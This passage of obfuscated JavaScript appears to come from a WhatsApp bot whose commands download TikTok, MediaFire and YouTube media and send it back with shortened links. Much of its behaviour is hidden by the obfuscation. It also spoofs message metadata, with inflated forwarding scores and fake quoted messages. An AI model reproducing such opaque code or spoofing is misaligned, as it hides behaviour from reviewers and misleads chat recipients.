_0x3d7aa8={};_0x3d7aa8[_0x15f8e1(0x9da,0x889,0x9bd,0x741)+'id']=[_0x201847,_0x44ddbb],_0x3d7aa8[_0x15f8e1(0x894,0x900,0x8ca,0x559)+'Score']=0x3e7,_0x3d7aa8[_0x15f8e1(0x962,0x854,0xa2f,0x605)+'d']=!![];const _0x3c14cb={};_0x3c14cb[_0x15f8e1(0x114c,0xcdf,0x10fb,0xd80)]=_0xa2aea9,_0x3c14cb[_0x15f8e1(0xc61,0x883,0x851,0x5f5)+'o']=_0x3d7aa8,_0x3c14cb['sendEpheme'+_0x2ec242(0x67c,0x518,0x296,0x375)]=!![],_0x1be06d['sendMessag'+'e'](_0x4e85da,_0x2eff68,_0x4276f9,_0x3c14cb);}});});break;case _0x4aaba1(0x623,0x445,0x31d,0x119):case _0x4aaba1(0xb2f,0xdda,0x101b,0xde3):case _0x406083(0xc78,0x79d,0xe5e,0xcab):if(!isUrl(args[-0x244+-0x2*-0x3a6+-0x508])&&!args[-0xe*-0xdf+-0x16*0x147+0xfe8][_0x4aaba1(0x5f5,0x4cf,0x46e,0x159)](_0x4aaba1(0x56a,0x868,0x294,0x72f)))return reply(lang[_0x406083(0x87a,0x913,0x960,0xc35)]());if(!q)return reply('Linknya?');reply(lang[_0x406083(0x425,0x559,0x538,0x363)]()),hx['ttdownload'+'er'](''+args[-0x1*0x1384+-0x4bd*-0x1+0xec7])['then'](_0x545fe4=>{function _0x88287f(_0x433557,_0x2a819c,_0x5f1001,_0x461835){return _0x406083(_0x5f1001-0x9,_0x2a819c-0x11e,_0x5f1001-0x1e5,_0x433557);}const _0x408301={'AKAwm':function(_0xa98d3a,_0x2d8794){return _0xa98d3a(_0x2d8794);},'mgdSl':'https://yo'+_0x537454(0x119b,0x9d8,0xcff,0x90c)+'xTH6oLd8'};function _0x537454(_0x1c8e78,_0x3ae350,_0x381a36,_0x39469a){return _0x4aaba1(_0x381a36- -0x50,_0x39469a,_0x381a36-0x19d,_0x39469a-0xa);}const {wm:_0x7650b2,nowm:_0x53a4a7,audio:_0x280550}=_0x545fe4;axios[_0x537454(0x96f,0x383,0x81a,0x74d)](_0x88287f(0x9df,0xa58,0x775,0x9a7)+_0x88287f(0x4df,0x7ae,0x36e,0x26c)+_0x537454(0xf1d,0x1199,0xce1,0x95c)+_0x88287f(0xacf,0x787,0xb57,0xa53)+_0x53a4a7)['then'](async _0x76a696=>{me=_0x5ebf12(0xf5,0x967,0x478,0x42b)+_0x76a696[_0x5ebf12(0x374,0x510,0x6f8,0x742)],nowmm=await _0x408301[_0x5ebf12(0x268,0x30b,0x221,0x3f6)](getBuffer,_0x53a4a7);const _0x35efad={};_0x35efad[_0x19111f(0x437,0x165,0x95f,0x425)]=_0x408301[_0x5ebf12(0x4e4,-0xfe,0x318,0x150)],_0x35efad[_0x19111f(0x8c7,0x6f2,0xaed,0xb00)]=0x2,_0x35efad[_0x5ebf12(0x976,0x385,0x85c,0x3de)]='Tiktok\x20No\x20'+_0x19111f(0x915,0x771,0xc1d,0x7cc);function _0x5ebf12(_0x5e35f1,_0xf530b0,_0x163cc9,_0xfa5088){return _0x537454(_0x5e35f1-0x1b9,_0xf530b0-0x1db,_0x163cc9- -0x1e0,_0xf530b0);}_0x35efad[_0x5ebf12(0x718,0x652,0x41d,0x517)]='',_0x35efad[_0x19111f(0x25e,0x47a,0x441,-0x10f)+'rl']='',_0x35efad[_0x5ebf12(0x4f2,0x565,0x4fc,-0x17)]=pp_userz;const _0x136a0a={};_0x136a0a[_0x19111f(0x552,0x9f0,0x188,0x1a9)+_0x19111f(0x5f6,0x3a5,0xab9,0x628)]=0x3b9aca00;function _0x19111f(_0x33fa91,_0x3ef1ec,_0x103fa4,_0x28baeb){return _0x537454(_0x33fa91-0x25,_0x3ef1ec-0x2b,_0x33fa91- -0x362,_0x28baeb);}_0x136a0a[_0x5ebf12(0x8bb,0x7c7,0x628,0xa92)+'d']=!![],_0x136a0a[_0x19111f(0xbf,0xa7,0x56b,-0x1af)+_0x19111f(0x8f,-0xd6,0x10b,-0x30f)]=!![],_0x136a0a[_0x5ebf12(0x891,0xb19,0x651,0x604)+_0x5ebf12(0xa23,0xc7a,0xb9e,0xc32)]=_0x35efad;const _0x891de3={};_0x891de3[_0x5ebf12(0x523,0x1bb,0x657,0x4d2)+'o']=_0x136a0a,_0x891de3[_0x5ebf12(0x6e3,0x660,0x5f5,0xb1a)]=_0x19111f(0xb8,-0x153,0x44b,-0x24e),_0x891de3[_0x5ebf12(0x4b0,0xb0b,0x8ad,0x8d8)]='Tiktok\x20No\x20'+_0x19111f(0x4c9,0x469,0x294,0x93),_0x891de3['quoted']=fgclink2,_0x891de3[_0x5ebf12(0x8f0,0x84f,0x4fc,0x640)]=pp_userz,alpha[_0x5ebf12(0x43e,0x3ff,0x684,0x3de)+'e'](from,nowmm,MessageType[_0x5ebf12(0x5f2,0xb09,0x711,0xb36)],_0x891de3);});});break;case _0x406083(0x8bf,0xa97,0xac8,0x8e3):if(!isUrl(args[-0x150c+-0x1*0x20ed+0x35f9])&&!args[0x89*0x1d+0x1ad0+-0x2a55][_0x406083(0x5c0,0x6ca,0x841,0x35a)]('tiktok.com'))return reply(lang[_0x4aaba1(0x8af,0xb59,0x971,0xad4)]());if(!q)return fakegroup(_0x4aaba1(0x3e9,0x3e0,0x215,-0x86));reply(lang['wait']()),hx[_0x406083(0xcde,0x11e2,0xd63,0xa4c)+'er'](''+args[-0x48d+0x1388+0x3b*-0x41])[_0x4aaba1(0xb65,0xacf,0xc30,0xc55)](_0x21cd57=>{const _0x375947={};_0x375947[_0x36c397(0x692,0x1f6,0x187,0x45e)]=_0x33ae56(-0x13e,0x4f8,0x47d,0x386);const _0x44a7a1=_0x375947,{wm:_0x83211c,nowm:_0x33c15b,audio:_0xff4e9a}=_0x21cd57;function _0x36c397(_0x2ddc8f,_0x80d784,_0x1033e4,_0x2bd330){return _0x4aaba1(_0x1033e4- -0x3c0,_0x80d784,_0x1033e4-0x168,_0x2bd330-0x12d);}function _0x33ae56(_0x451809,_0xaa3aa6,_0x5d2df0,_0x54146f){return _0x4aaba1(_0x54146f- -0xe4,_0xaa3aa6,_0x5d2df0-0xba,_0x54146f-0x107);}axios['get'](_0x33ae56(0x3a9,0x9ca,0x769,0x6bd)+_0x36c397(-0x58,-0x29f,-0x26,-0x1ed)+_0x33ae56(0x8df,0xc65,0x1035,0xc4d)+_0x36c397(0x481,0x8fe,0x7c3,0xb5f)+_0x83211c)['then'](async _0x15873f=>{me=_0x21e133(0x8f6,0x943,0x863,0xd4e)+_0x15873f['data'],wmm=await getBuffer(_0x83211c);const _0x428de0={};_0x428de0['mediaUrl']=_0x51b8f7(0xbb5,0x72a,0x963,0x8b1)+_0x21e133(0x1088,0xe98,0xf0a,0x140a)+_0x51b8f7(0x661,0x682,0x57a,0x5d4),_0x428de0[_0x21e133(0x1295,0x12e5,0xe34,0x9d2)]=0x2,_0x428de0['title']=_0x51b8f7(0xb9a,0x82b,0x9a9,0xa1e)+_0x21e133(0xb6e,0x6b6,0x6d1,0x6a1)+'k',_0x428de0[_0x21e133(0x67a,0xbb7,0x808,0xa8f)]='',_0x428de0[_0x51b8f7(0x9a9,0x588,0xc39,0x7f7)+'rl']='',_0x428de0[_0x51b8f7(0x81c,0x6dc,0x407,0x913)]=pp_userz;const _0x4a7524={};_0x4a7524[_0x51b8f7(0xf82,0xcaa,0x81d,0xaeb)+'Score']=0x3b9aca00,_0x4a7524[_0x51b8f7(0x561,0xdc0,0xa5c,0xa3f)+'d']=!![],_0x4a7524['sendEpheme'+_0x21e133(0x201,0x90b,0x5fc,0x302)]=!![],_0x4a7524['externalAd'+'Reply']=_0x428de0;function _0x51b8f7(_0x3b9687,_0x486c3d,_0x38fb0d,_0x480004){return _0x33ae56(_0x3b9687-0x1a7,_0x38fb0d,_0x38fb0d-0xe5,_0x480004-0x2cb);}const _0x17db6d={};_0x17db6d['contextInf'+'o']=_0x4a7524,_0x17db6d[_0x21e133(0x8b8,0x7b3,0x9e0,0x51c)]=_0x44a7a1[_0x21e133(0x356,0x8b0,0x702,0x632)],_0x17db6d[_0x51b8f7(0xa01,0xd1a,0xf34,0xcc4)]=_0x51b8f7(0x8e8,0xc54,0x91d,0xd33)+_0x21e133(0xde9,0xf88,0xdfb,0x114f);function _0x21e133(_0x2a89dd,_0xa09552,_0x1f3111,_0xa855c5){return _0x33ae56(_0x2a89dd-0x153,_0x2a89dd,_0x1f3111-0xe,_0x1f3111-0x29f);}_0x17db6d[_0x21e133(0xd0d,0x1045,0xe9e,0xeb8)]=fgclink2,_0x17db6d[_0x51b8f7(0x696,0x46b,0xa34,0x913)]=pp_userz,alpha[_0x51b8f7(0x95b,0xece,0x629,0xa9b)+'e'](from,wmm,MessageType['document'],_0x17db6d);});})[_0x406083(0xa96,0xb74,0xcdd,0xccf)](_0x3619a5=>console['log'](_0x3619a5));break;case _0x406083(0xa42,0x6c7,0x5e7,0xe6a):const _0x445c3b={};_0x445c3b[_0x4aaba1(0x543,0xa5e,0x1df,0x922)+'t']=_0x406083(0x8c8,0xa24,0xd6f,0x405)+_0x406083(0xae4,0xb94,0x7d2,0xd92);const _0x336924={};_0x336924[_0x406083(0x758,0x385,0xb19,0x2b0)]='goprem',_0x336924['buttonText']=_0x445c3b,_0x336924[_0x4aaba1(0x816,0xba5,0xb26,0x321)]=0x1;const _0x468c8c={};_0x468c8c[_0x4aaba1(0xce3,0xf3c,0xaeb,0xa8a)]=mek;if(!isPremium)return sendButMessage(from,_0x406083(0xb59,0x85d,0x769,0x6e3)+_0x406083(0xcec,0x11cc,0x11b6,0x104f)+_0x406083(0x5b6,0x59b,0x328,0x15f)+_0x4aaba1(0x673,0x352,0x860,0x4db)+_0x4aaba1(0x901,0xcfb,0xbda,0xa3b)+_0x4aaba1(0x5cf,0x935,0x88b,0x62a)+'\x20akun\x20mu\x20s'+_0x406083(0x987,0x6dd,0x74d,0x642)+_0x4aaba1(0x395,0x74d,0x597,0x248)+_0x4aaba1(0x99d,0x803,0xb09,0xb43)+prefix+_0x4aaba1(0x9b7,0xeac,0xa50,0xa16),'Click\x20butt'+_0x4aaba1(0x993,0x8e1,0x5f4,0xbc9),[_0x336924],_0x468c8c);if(args['length']<0x4*-0x91f+-0x713*-0x3+0xf44)return reply(_0x406083(0x4b5,0x493,0x572,0x3c9)+'ana?\x20');if(!isUrl(args[0x1df5+0xf4d*0x1+-0x2d42])&&!args[0x46*-0x3+-0x8bf+-0x1*-0x991][_0x4aaba1(0x5f5,0x146,0x3f2,0x27b)](_0x406083(0xa42,0xacc,0xf42,0xf0f)))return reply(mess[_0x406083(0xab7,0x910,0x90c,0xc81)]['Iv']);reply(lang[_0x4aaba1(0x45a,0x400,0x4c0,0x67e)]()),teks=args[_0x406083(0xadd,0xddf,0x668,0x9c0)]('\x20'),res=await mediafireDl(teks),result=_0x406083(0x929,0x4cc,0xc37,0x9e5)+_0x4aaba1(0x664,0xaab,0xa85,0x2bf)+'R*\x0a\x09\x09\x09\x09\x0a'+petik+_0x4aaba1(0x6c5,0x485,0x3af,0x7b9)+petik+'\x20'+res[-0x21d9+-0x7eb*-0x3+0x4*0x286][_0x406083(0x747,0x8b2,0xab3,0x50f)]+'\x0a'+petik+'々\x20Link\x20:\x20'+petik+'\x20'+res[0x469*0x4+0x1*0xf91+-0x2135]['link']+'\x0a'+petik+'々\x20Size\x20:\x20'+petik+'\x20'+res[-0x1*0x1780+0x1347+0x439]['size']+('\x0a\x09\x09\x09\x09\x0a_Upl'+_0x4aaba1(0x82a,0x738,0x6dc,0x73d)+_0x4aaba1(0xc83,0xf4b,0xa46,0x803)),await reply(result),mdf=await getBuffer(res[-0x3*0x949+-0x1*-0x18d1+-0x30a*-0x1][_0x4aaba1(0x439,0x1f5,0x308,0x5b3)]);const _0x4316dc={};_0x4316dc[_0x4aaba1(0x7e9,0x961,0x7b6,0x440)]=_0x4aaba1(0x6ca,0x416,0x3b5,0x770)+_0x406083(0xd1a,0xae9,0xafc,0x1068)+_0x4aaba1(0x3ed,0x327,0x330,0x3a0),_0x4316dc[_0x4aaba1(0xc79,0xd9e,0xa5f,0x10cb)]=0x2,_0x4316dc[_0x406083(0xa57,0x7c3,0x827,0x87c)]=_0x4aaba1(0x9d2,0xd17,0x607,0xde7)+_0x406083(0xda9,0x1106,0x11c4,0xbf0),_0x4316dc[_0x406083(0x618,0x796,0x905,0x9cb)]='',_0x4316dc[_0x406083(0x5db,0x573,0x61d,0x6b9)+'rl']='',_0x4316dc[_0x4aaba1(0x72c,0xa3a,0x310,0x7f4)]=pp_userz;const _0x5235e1={};_0x5235e1[_0x4aaba1(0x904,0x50c,0x5a9,0xb9a)+'Score']=0x3b9aca00,_0x5235e1[_0x4aaba1(0x858,0x8a5,0xaec,0x7d3)+'d']=!![],_0x5235e1[_0x406083(0x43c,0x548,-0x11,0x2a4)+_0x4aaba1(0x441,-0xb1,0x2a7,0x6)]=!![],_0x5235e1[_0x406083(0x84c,0xc97,0x463,0xc22)+_0x406083(0xd99,0x129f,0xbcb,0xb53)]=_0x4316dc;const _0x4b9f13={};_0x4b9f13[_0x406083(0x852,0xc25,0x7e7,0x5c2)+'o']=_0x5235e1,_0x4b9f13[_0x4aaba1(0x825,0x5e9,0xb0f,0xaf6)]=res[-0x14f8+0x1*-0x1d69+-0x1*-0x3261]['mime'],_0x4b9f13[_0x4aaba1(0xadd,0x7e4,0x8d6,0xed8)]=res[0x1838+0x519*0x7+0x5*-0xbfb][_0x4aaba1(0x77c,0x53d,0x39c,0x40d)],_0x4b9f13[_0x4aaba1(0xce3,0x10b2,0x9bc,0xdf8)]=fgclink,_0x4b9f13['thumbnail']=pp_userz,alpha[_0x406083(0x87f,0xcd9,0xb4c,0xa2c)+'e'](from,mdf,MessageType['document'],_0x4b9f13);break;case _0x4aaba1(0x885,0x97b,0x4f3,0x914):if(args[_0x4aaba1(0x7cc,0x2f7,0x5d9,0xc1e)]===0x1*0x220d+-0x622*0x1+0x7*-0x3fd)return reply(_0x4aaba1(0x9c0,0x55f,0x5a0,0x4a4)+_0x4aaba1(0xae2,0x73b,0x691,0x922)+prefix+(_0x4aaba1(0x4d9,0x7ec,0x87f,0x73a)+_0x406083(0xb54,0xe1e,0x94f,0x932)+_0x4aaba1(0x61b,0x910,0xaca,0x51c)+_0x4aaba1(0xd77,0x115e,0xca7,0x870)));var srch=args[_0x4aaba1(0xb12,0xc34,0x90e,0x8d5)]('');aramas=await yts(srch),server=_0x406083(0x83e,0xb57,0x73a,0xb60),aramat=aramas[_0x4aaba1(0x701,0x2dd,0x53c,0x98d)];var mulaikah=aramat[0x23b2+0x1e3c+0xafd*-0x6][_0x4aaba1(0xa11,0x69d,0x8ed,0xa98)];try{ytv2(mulaikah,server)[_0x406083(0xb30,0xc14,0xea4,0xbfb)](_0x12c41f=>{function _0x2d8417(_0x1ac861,_0x56e028,_0x55fde5,_0x320a2a){return _0x406083(_0x320a2a- -0x222,_0x56e028-0x50,_0x55fde5-0x26,_0x56e028);}function _0x702e3b(_0x85d64b,_0x4cc5c4,_0x1849fb,_0x39d3d0){return _0x406083(_0x1849fb-0x1fc,_0x4cc5c4-0x18,_0x1849fb-0x95,_0x85d64b);}const _0x4c4943={'CaJCz':function(_0x4a1dd2,_0x3a2586){return _0x4a1dd2>=_0x3a2586;},'refvd':function(_0x14fe92,_0x578992,_0x47e3f0,_0x53d405){return _0x14fe92(_0x578992,_0x47e3f0,_0x53d405);},'VJEWJ':function(_0x1f8cf9,_0x598609,_0x16a9af,_0x417ec0){return _0x1f8cf9(_0x598609,_0x16a9af,_0x417ec0);},'WaUYC':function(_0x5a0d4f,_0x88234d,_0x36f1cc){return _0x5a0d4f(_0x88234d,_0x36f1cc);}},{dl_link:_0x288a71,thumb:_0x4acf7c,title:_0x43a894,filesizeF:_0x6680b0,filesize:_0xa1404b}=_0x12c41f;axios[_0x702e3b(0x991,0x81f,0xa31,0xcdb)](_0x702e3b(0x7da,0xe65,0x968,0xadb)+_0x702e3b(0x5c,0x9f9,0x561,0x777)+'api-create'+_0x702e3b(0xd78,0xc4f,0xd4a,0x107c)+_0x288a71)['then'](async _0x1b53db=>{function _0x1175c3(_0x272c74,_0x2fa06e,_0xe9118f,_0x1f5fa3){return _0x2d8417(_0x272c74-0xea,_0x1f5fa3,_0xe9118f-0x9f,_0x2fa06e-0x1d4);}function _0x2075d8(_0x15cd9d,_0x2f72ae,_0x11a5ef,_0x48673d){return _0x702e3b(_0x15cd9d,_0x2f72ae-0x3b,_0x2f72ae- -0x21b,_0x48673d-0x186);}if(_0x4c4943[_0x2075d8(0x2af,0x520,0x698,0x4ef)](Number(_0xa1404b),-0x22dac+-0x1*-0x15b82+0x369e*0xb))return _0x4c4943['refvd'](sendMediaURL,from,_0x4acf7c,_0x2075d8(0xa20,0xa94,0x6a6,0xc9a)+_0x1175c3(0xe60,0xb59,0x85a,0x8ae)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x43a894+enter+(_0x2075d8(0xc07,0x926,0x435,0xdfc)+_0x2075d8(0x841,0x4c9,0x521,0x419)+'s')+enter+(_0x2075d8(0x400,0x8dc,0x52b,0x7c6)+_0x1175c3(0x4ff,0x971,0x544,0xae7))+enter+(_0x2075d8(0x913,0x487,0x5f3,0x479)+_0x1175c3(0x112c,0xd22,0x1236,0x8e6))+_0x6680b0+enter+(_0x1175c3(0x27b,0x6dc,0x77e,0x57b)+'\x20')+_0x1b53db[_0x1175c3(0xb2f,0x8a5,0x53d,0xa4a)]+enter+enter+('_Untuk\x20dur'+_0x2075d8(0x806,0x640,0x3ae,0x69c)+_0x1175c3(0x8b2,0xbb4,0x9d9,0x948)+'\x20disajikan'+_0x1175c3(0x7bd,0x562,0x283,0x734)+'tuk\x20link_'));const _0x1e4ece=_0x1175c3(0xd9c,0xa65,0x73b,0x72e)+_0x2075d8(0x72c,0xb88,0x9c7,0x81a)+enter+enter+(_0x2075d8(0xc21,0x758,0x6cd,0x48f)+':\x20')+_0x43a894+enter+(_0x2075d8(0x900,0x926,0xbde,0xa51)+_0x1175c3(0x181,0x49a,0x738,0x447)+'s')+enter+(_0x1175c3(0x746,0x8ad,0xc4b,0xba3)+_0x2075d8(0x708,0x9a0,0xa08,0xc1b))+enter+('🐭\x20*Filesiz'+_0x1175c3(0x11d0,0xd22,0x9cc,0xc63))+_0x6680b0+enter+(_0x2075d8(0x4d7,0x70b,0x45d,0x7b0)+'\x20')+_0x1b53db['data']+enter+enter+(_0x1175c3(0x229,0x55b,0x356,0x228)+_0x2075d8(0x88b,0x594,0x868,0xa4c)+_0x1175c3(0x5a9,0x4bc,0x836,0x2f8)+_0x1175c3(0x465,0x7cc,0x71d,0x56e)+_0x1175c3(0x8fa,0xb86,0x7ea,0xdc0)+'\x20butuh\x20beb'+'erapa\x20meni'+'t_');_0x4c4943['VJEWJ'](sendMediaURL,from,_0x4acf7c,_0x1e4ece),await _0x4c4943[_0x1175c3(0x8d3,0x78e,0x5e5,0x592)](sendMediaURL,from,_0x288a71)[_0x1175c3(0x91c,0xa48,0xb50,0xb59)](()=>reply(_0x2075d8(0x978,0xa98,0xc3b,0x809)));});});}catch(_0x22af19){reply(mess[_0x406083(0xab7,0x902,0x9e5,0xbba)][_0x406083(0x43d,0x573,0x86d,-0x6c)]);}break;case'videohd':if(args[_0x406083(0x797,0x5ce,0x5f7,0x7b2)]===-0x1*-0x25c7+-0x4*-0x232+-0x19b*0x1d)return reply('Kirim\x20peri'+_0x406083(0xaad,0xada,0x63f,0x95c)+prefix+(_0x4aaba1(0x4d9,0x495,0x3b8,0x52f)+_0x406083(0xb54,0x648,0xcea,0xf77)+'yang\x20akan\x20'+_0x4aaba1(0xd77,0x113b,0xff9,0x10ff)));var srch=args[_0x406083(0xadd,0x66b,0x87c,0x90a)]('');aramas=await yts(srch),server=_0x4aaba1(0x873,0x916,0xbf9,0x870),aramat=aramas[_0x406083(0x6cc,0x789,0xa50,0x3e0)];var mulaikah=aramat[0xdc0+-0x5*-0x3df+-0x211b][_0x4aaba1(0xa11,0xa6f,0x9ca,0xc93)];try{ytv3(mulaikah,server)[_0x406083(0xb30,0x996,0x6a9,0x1036)](_0x4b210b=>{const _0x257cc2={'FlAyP':function(_0x255268,_0x456312){return _0x255268>=_0x456312;},'XqfAD':function(_0x320434,_0x1117ff){return _0x320434(_0x1117ff);},'JYrTS':function(_0x472d46,_0x4052cc,_0x4bc958,_0x163994){return _0x472d46(_0x4052cc,_0x4bc958,_0x163994);},'HCgQk':function(_0x3d7e1f,_0x2b20d4,_0x3ece5b){return _0x3d7e1f(_0x2b20d4,_0x3ece5b);}},{dl_link:_0x397639,thumb:_0x451591,title:_0x46131d,filesizeF:_0x2c7c99,filesize:_0x26dd75}=_0x4b210b;function _0x312a85(_0x24e633,_0x11fba6,_0x107811,_0x4a56c9){return _0x4aaba1(_0x107811-0x125,_0x24e633,_0x107811-0x15c,_0x4a56c9-0x29);}function _0x34e5b5(_0x24d09a,_0x1d1552,_0x384ec4,_0x47f7a4){return _0x4aaba1(_0x24d09a- -0x3a9,_0x384ec4,_0x384ec4-0x112,_0x47f7a4-0x137);}axios[_0x312a85(0x9e9,0xc8a,0x98f,0xe35)](_0x312a85(0xd8f,0x41a,0x8c6,0xc62)+'nyurl.com/'+_0x312a85(0xf91,0xdbe,0xe56,0x133d)+_0x34e5b5(0x7da,0xb22,0xac5,0x358)+_0x397639)[_0x312a85(0x11ac,0xadb,0xc8a,0xc4f)](async _0x51d140=>{if(_0x257cc2['FlAyP'](_0x257cc2[_0x3ef472(0xb08,0x88a,0x1113,0xd21)](Number,_0x26dd75),-0x7b14+-0x19054+-0x1c904*-0x2))return sendMediaURL(from,_0x451591,_0x36dea2(0x8fe,0x8ba,0xbbb,0x934)+_0x3ef472(0xc53,0x858,0xa2e,0xd09)+enter+enter+(_0x36dea2(0x6e,0x57e,0x41c,0x97f)+':\x20')+_0x46131d+enter+(_0x36dea2(0xada,0x74c,0x60a,0x894)+_0x3ef472(0x36e,0x35d,0x6b5,0x64a)+'s')+enter+(_0x36dea2(0x746,0x702,0x633,0x9b2)+_0x3ef472(0xd05,0x708,0x858,0xb21))+enter+(_0x3ef472(0x206,0x43c,0xaa7,0x608)+_0x3ef472(0xad0,0x9c6,0xcf5,0xed2))+_0x2c7c99+enter+(_0x36dea2(0x135,0x531,0xf2,0x8bb)+'\x20')+_0x51d140['data']+enter+enter+(_0x3ef472(0x23b,0x1a7,0x40c,0x63f)+_0x36dea2(0x87d,0x466,0x2ed,0x67f)+'dari\x20batas'+_0x36dea2(0xbb7,0x77d,0x546,0x334)+'\x20dalam\x20ben'+'tuk\x20link_'));function _0x36dea2(_0x3b33e9,_0x225c79,_0x422aa1,_0x35fe87){return _0x34e5b5(_0x225c79-0x17b,_0x225c79-0x1b,_0x3b33e9,_0x35fe87-0xec);}function _0x3ef472(_0x40afb3,_0x1651c7,_0x5c4453,_0x171ace){return _0x34e5b5(_0x171ace-0x4d6,_0x1651c7-0x166,_0x1651c7,_0x171ace-0x1b5);}const _0x360606=_0x36dea2(0xd08,0x8ba,0xda6,0xaf6)+_0x3ef472(0xf3e,0x7ef,0x11c1,0xd09)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x46131d+enter+(_0x3ef472(0x916,0x91d,0x5e6,0xaa7)+_0x36dea2(0x4cc,0x2ef,0x24b,0x5e4)+'s')+enter+(_0x3ef472(0xe21,0x5af,0x5c3,0xa5d)+_0x36dea2(0x2ad,0x7c6,0x7e7,0x2a4))+enter+(_0x36dea2(0x39,0x2ad,-0x56,-0x55)+_0x36dea2(0xcb2,0xb77,0xa5b,0xcce))+_0x2c7c99+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x51d140[_0x36dea2(0xb67,0x6fa,0x707,0x795)]+enter+enter+(_0x3ef472(0xbe4,0x56a,0x61f,0x70b)+_0x36dea2(0x95,0x3ba,0x4d9,0x3fb)+_0x3ef472(0x872,0xafb,0x678,0x66c)+_0x3ef472(0x78c,0x931,0xc11,0x97c)+'im\x20mungkin'+_0x36dea2(0x744,0x934,0x41d,0x736)+'erapa\x20meni'+'t_');_0x257cc2[_0x3ef472(0x4aa,0x956,0x766,0x939)](sendMediaURL,from,_0x451591,_0x360606),await _0x257cc2[_0x36dea2(-0x19a,0x220,0x249,0x3b3)](sendMediaURL,from,_0x397639)[_0x36dea2(0x9bc,0x89d,0x527,0xc6c)](()=>reply('error'));});});}catch(_0x41f238){reply(mess[_0x4aaba1(0xaec,0xdb1,0xb8a,0xef7)]['api']);}break;case _0x4aaba1(0x521,0x37b,0x611,0x4):if(args['length']===0x9d7+0x7*0x23c+0x197b*-0x1)return reply(_0x406083(0x98b,0x6da,0x80b,0x79b)+_0x4aaba1(0xae2,0xc9b,0xc50,0x777)+prefix+(_0x4aaba1(0xd9b,0xe86,0xa37,0xff2)+'kYt]*'));let isLinks2=args[-0x22b5+-0x1*-0xab6+0x17ff*0x1][_0x4aaba1(0x841,0x40b,0x8fc,0x930)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks2)return reply(mess[_0x406083(0xab7,0xc0b,0x9f0,0x6c6)]['Iv']);server='en68';try{let yut=await yts(args[0x1b01+0x2*-0xd0b+-0xeb]);reply(lang[_0x4aaba1(0x45a,0x80f,0x115,0x4d4)]()),ytv2(args[0x1677*-0x1+-0x146+0x17bd],server)[_0x406083(0xb30,0xc1b,0x8ac,0x641)](_0xa5f173=>{function _0x216c10(_0x69f171,_0x202aab,_0x450164,_0x33d7b4){return _0x406083(_0x33d7b4-0x85,_0x202aab-0xdf,_0x450164-0x8f,_0x69f171);}const _0xe4360d={'dfzAV':function(_0x4b9391,_0x5581d3){return _0x4b9391>=_0x5581d3;},'KJMLu':function(_0x44d9bd,_0x5b052b){return _0x44d9bd(_0x5b052b);},'ROJPC':'RESPONSE','kjmOv':_0x1f0365(0x8f4,0x52d,0x96e,0x403)+_0x1f0365(0x8de,0xdca,0x728,0x70b)};function _0x1f0365(_0x15800f,_0x1a5031,_0x366dba,_0x262f00){return _0x406083(_0x15800f- -0x403,_0x1a5031-0x28,_0x366dba-0x84,_0x366dba);}const {dl_link:_0x4f18d4,thumb:_0x4f1563,title:_0x2d782d,filesizeF:_0x27e2d4,filesize:_0x423d32}=_0xa5f173;axios[_0x216c10(0x3b7,0x3b3,0xbbf,0x8ba)](_0x216c10(0x472,0x62e,0xb10,0x7f1)+_0x216c10(-0x36,0x7be,0x31b,0x3ea)+_0x216c10(0xe0b,0xe6f,0xad3,0xd81)+_0x216c10(0x6f3,0x80f,0xa56,0xbd3)+_0x4f18d4)['then'](async _0x3a4a56=>{if(_0xe4360d[_0x9291f1(0x9a0,0x66f,0x691,0x5d6)](_0xe4360d[_0xe7ceef(0x6cd,0x368,0x544,0x801)](Number,_0x423d32),-0x5074+0x8cf+-0x3*-0x4bf7))return sendMediaURL(from,_0x4f1563,_0x9291f1(0xb35,0xfc1,0xc9c,0x9ca)+_0x9291f1(0x41c,0x675,0x6d1,0x6c7)+_0xe7ceef(0x309,0x6c8,0x36d,0x37c)+enter+enter+(_0xe7ceef(0x607,0x3b9,0x65b,0x38a)+'\x20')+_0x2d782d+enter+(_0xe7ceef(0xc6b,0x88f,0x905,0xbaf)+'MP3')+enter+(_0xe7ceef(0x33c,0x679,0x7c5,0x806)+'e\x20:*\x20')+_0x27e2d4+enter+(_0xe7ceef(0xe2c,0x9ba,0xa9c,0xcd9)+'\x20')+_0x3a4a56['data']+enter+enter+(_0xe7ceef(0x418,0x1a6,0x4ee,0x6ca)+_0xe7ceef(-0xbf,0x328,0x9b,-0x104)+'dari\x20batas'+'\x20disajikan'+_0x9291f1(0x56b,0x663,0x33f,0x668)+_0x9291f1(0xa75,0x77e,0xf20,0xbe0)));function _0x9291f1(_0x3ee040,_0x3afdc2,_0x864169,_0x1c956c){return _0x1f0365(_0x3ee040-0x3be,_0x3afdc2-0x6,_0x1c956c,_0x1c956c-0x54);}const _0x22ea16=_0x9291f1(0xd02,0xfdf,0x1220,0x8ec)+_0x9291f1(0x4ae,0x98d,0x12e,0x4b4)+_0x9291f1(0x789,0xb71,0xb41,0xa24)+_0xe7ceef(0x632,0x21a,0x5b3,0x719)+_0x2d782d+(_0xe7ceef(0x8da,0x59d,0x38f,0x713)+_0x9291f1(0x34a,0x734,0x590,0x4fe))+yut[_0x9291f1(0x332,0x3ad,-0xd0,-0x87)][0x1*-0x1ec1+-0x21*-0x2d+0x18f4][_0x9291f1(0x4d5,0x8c3,0x4aa,0x2d9)]+(_0x9291f1(0x8f0,0x546,0x98e,0xbe3)+':\x20')+yut[_0xe7ceef(0x1db,0x40,-0x2ae,0x3d)][-0xb6*-0x31+0x24f3+-0x47c9][_0xe7ceef(0x27b,0x2d1,0x60d,0x4c2)]+('\x20\x0a🎃\x20Size\x20:'+'\x20')+_0x423d32+(_0x9291f1(0xcf8,0xebc,0xc33,0xd88)+':\x20')+yut['videos'][0x1038*0x1+0x24cb+0x3503*-0x1][_0xe7ceef(0x1f1,0x113,-0xde,0x362)]+('\x20\x0a🐣\x20Durati'+'on\x20:\x20')+yut['videos'][0x52*0x29+-0x95*-0x1d+-0x27*0xc5]['timestamp']+'\x0a🌀\x20Url\x20:\x20'+yut[_0xe7ceef(0x4d5,0x40,-0xb3,0x48f)][-0x24a9+0x1*0x266d+-0x1c4][_0xe7ceef(0x6f6,0x6a5,0x6a8,0x674)];let _0xf97546=await _0xe4360d[_0xe7ceef(-0x19c,0x368,0x157,0x625)](getBuffer,_0x4f1563);const 